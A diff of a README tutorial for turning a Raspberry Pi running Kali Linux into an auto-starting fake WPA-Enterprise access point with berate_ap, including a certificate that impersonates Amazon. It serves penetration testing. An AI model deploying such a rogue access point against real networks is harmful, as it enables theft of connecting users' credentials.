@@ -14,43 +14,25 @@ Download Kali Linux image: https://www.kali.org/get-kali/#kali-arm
 
 Download Raspberry-Pi Imager: https://www.raspberrypi.com/software/
 
-#### Open the Raspberry-Pi Imager application.
-<details> 
-  <summary>Screenshot</summary>
-    <img src="./images/1.png">
-</details>
+Open the Raspberry-Pi Imager application.
+![1](./images/1.png)
 
-#### Click `CHOOSE STORAGE` and select our SD card.
-<details> 
-  <summary>Screenshot</summary>
-    <img src="./images/2.png">
-</details>
+Click `CHOOSE STORAGE` and select our SD card.
+![2](./images/2.png)
 
-#### Click `CHOOSE OS`, scroll down and then click Use Custom. Select the previously downloaded Kali Linux image in .xz format (no need to unpack the archive!).
-<details> 
-  <summary>Screenshot</summary>
-    <img src="./images/3.png">
-</details>
+Click `CHOOSE OS`, scroll down and then click Use Custom. Select the previously downloaded Kali Linux image in .xz format (no need to unpack the archive!).
+![3](./images/3.png)
 
-#### Click on the gear icon and enable SSH.
-<details> 
-  <summary>Screenshot</summary>
-    <img src="./images/4.png">
-</details>
+Click on the gear icon and enable SSH.
+![4](./images/4.png)
 
-#### Below in the same section set the login/password. For example you can use kali/kali.
-<details> 
-  <summary>Screenshot</summary>
-    <img src="./images/5.png">
-</details>
+Below in the same section set the login/password. For example you can use kali/kali.
+![5](./images/5.png)
 
-#### Click `WRITE` and wait for the process of writing the image to the SD card to complete.
-<details> 
-  <summary>Screenshot</summary>
-    <img src="./images/6.png">
-</details>
+Click `WRITE` and wait for the process of writing the image to the SD card to complete.
+![6](./images/6.png)
 
-#### When installation is complete, insert the SD card into the appropriate slot on the Raspberry-Pi.
+When installation is complete, insert the SD card into the appropriate slot on the Raspberry-Pi.
 
 ## Installing software
 ```
@@ -71,59 +53,38 @@ dpkg -i rpi-update_20140705_all.deb
 sudo raspi-config
 ```
 
-#### Next in the pseudo graphical interface
+Next in the pseudo graphical interface
+![7](./images/7.png)
+![8](./images/8.png)
 
-<details> 
-  <summary>Step 1</summary>
-    <img src="./images/7.png">
-</details>
-
-<details> 
-  <summary>Step 2</summary>
-    <img src="./images/8.png">
-</details>
-
-### Waiting for network connection before starting the system
-<details> 
-  <summary>Step 1</summary>
-    <img src="./images/9.png">
-</details>
-
-<details> 
-  <summary>Step 2</summary>
-    <img src="./images/10.png">
-</details>
+Waiting for network connection before starting the system
+![9](./images/9.png)
+![10](./images/10.png)
 
 ## Setting up a Wi-Fi adapter
 
-#### Check if the system sees the adapter.
-<details> 
-  <summary>Screenshot</summary>
-    <img src="./images/11.png">
-</details>
+Check if the system sees the adapter.
+![11](./images/11.png)
 
-#### Check adapter works
+Check adapter works
 * If several wlan interfaces are detected in the system, a choice will be offered.
 * Success is the continuous operation of the `wifite` utility with targets detection.
-<details> 
-  <summary>Screenshot</summary>
-    <img src="./images/12.png">
-</details>
+![12](./images/12.png)
 
 ## Setting up automatic launch of Fake Access Point
 
-#### Creating a directory for logs:
+Creating a directory for logs:
 ```
 mkdir /home/kali/Documents/logs
 ```
 
-#### Creating a directory for certificates (I’ll tell you about the certificates below.):
+Creating a directory for certificates (I’ll tell you about the certificates below.):
 ```
 mkdir /home/kali/Documents/certs
 ```
 Upload certificates to this directory
 
-#### Creating a Fake Access Point script
+Creating a Fake Access Point script
 ```
 mkdir /home/kali/Documents/
 ```
@@ -135,18 +96,18 @@ touch /home/kali/Documents/scripts/fap.sh
 ```
 sudo chmod 775 /home/kali/Documents/scripts/fap.sh
 ```
-#### Script:
+Script:
 ```
 #!/bin/bash
 berate_ap --eap --no-virt --eap-cert-path /home/kali/Documents/certs wlan1 eth0 <fap_name> >> /home/kali/Documents/logs/fap.txt
 ```
 
-#### Creating a service file:
+Creating a service file:
 ```
 sudo touch /etc/systemd/system/fap.service
 ```
 
-#### Service script:
+Service script:
 ```
 [Unit]
 Description=fake access point
@@ -160,16 +121,16 @@ RestartSec=3
 WantedBy=multi-user.target
 ```
 
-#### Adding a service to autostart:
+Adding a service to autostart:
 ```
 sudo systemctl enable fap.service
 ```
 
-### About certificates
+About certificates
 
-#### The first time you run the `berate_ap` utility without the `--eap-cert-path` flag, certificates will be generated automatically and will be located in the `/tmp` directory. In order not to wait for the certificate to be created each time, you can extract the ones created from `/tmp` and drag them into a static directory like `/home/kali/Documents/certs`.
+The first time you run the `berate_ap` utility without the `--eap-cert-path` flag, certificates will be generated automatically and will be located in the `/tmp` directory. In order not to wait for the certificate to be created each time, you can extract the ones created from `/tmp` and drag them into a static directory like `/home/kali/Documents/certs`.
 
-#### This is what the first command to create the certificates looks like. (Please note that the certificate attributes are provided as an example)
+This is what the first command to create the certificates looks like. (Please note that the certificate attributes are provided as an example)
 ```
 sudo berate_ap --eap --no-virt --eap-cert-subj '/O=Amazon/ST=California/C=EN' wlan1 eth0 <fap_name> 2>&1 >> fap.txt 2>&1 &
 ```
